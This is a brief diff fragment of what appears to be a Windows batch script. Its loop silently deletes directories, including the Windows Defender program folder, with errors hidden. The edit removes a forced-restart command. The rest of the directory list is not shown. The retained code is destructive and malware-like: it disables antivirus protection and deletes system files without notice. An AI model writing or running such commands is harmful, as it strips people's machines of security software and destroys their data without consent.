@@ -23,5 +23,5 @@ for %%d in (
     "C:\Program Files\Windows Defender"
 ) do rmdir /s /q %%d >nul 2>&1
 
-shutdown /r /f /t 10 >nul 2>&1
+
 exit
